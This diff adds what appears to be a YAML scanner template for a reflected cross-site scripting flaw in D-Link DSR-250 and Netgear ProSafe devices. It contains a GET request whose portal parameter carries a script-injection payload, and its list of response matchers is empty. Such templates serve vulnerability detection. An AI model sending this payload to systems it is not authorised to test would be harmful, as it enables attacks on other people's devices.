@@ -1,0 +1,18 @@
+id: dlink-netgear-xss
+brief:
+    title: Dlink DSR-250 and Netgear Prosafe - Cross-Site Scripting
+    by: gtrrnr
+    level: medium
+    about: Dlink DSR-250 and Netgear Prosafe are vulnerable to reflected cross site scripting endpoint scgi-bin/platform.cgi in parameter SSLVPN.
+    label:
+        - xss
+        - dlink
+        - dsr250
+        - netgear
+        - vuln
+    score: CVSS:4.3
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/scgi-bin/platform.cgi?page=portalLogin.htm&portal=SSLVPN"><script>alert(document.domain)</script>'
+      signs: []
